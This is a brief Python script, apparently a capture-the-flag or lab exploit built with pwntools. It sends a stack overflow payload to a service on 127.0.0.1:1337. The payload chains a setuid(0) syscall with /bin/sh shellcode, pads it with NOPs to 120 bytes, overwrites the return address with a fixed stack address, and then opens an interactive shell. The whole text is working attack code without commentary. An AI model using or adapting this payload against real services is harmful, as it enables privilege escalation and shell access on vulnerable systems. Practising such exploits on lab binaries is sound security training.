#!/usr/bin/env python

from pwn import * 


context.arch = 'amd64'

#p = process('./vulnerable_program_static', aslr=False, env={})

p = remote('127.0.0.1', 1337)


payload = asm("""
    xor rdi, rdi 
    mov rax, 0x69 
    syscall 
""")
payload += asm(shellcraft.sh())
payload += asm(shellcraft.nop()) * (120 - len(payload)) 
payload += p64(0x7fffffffec70)

p.send(payload)

p.interactive()
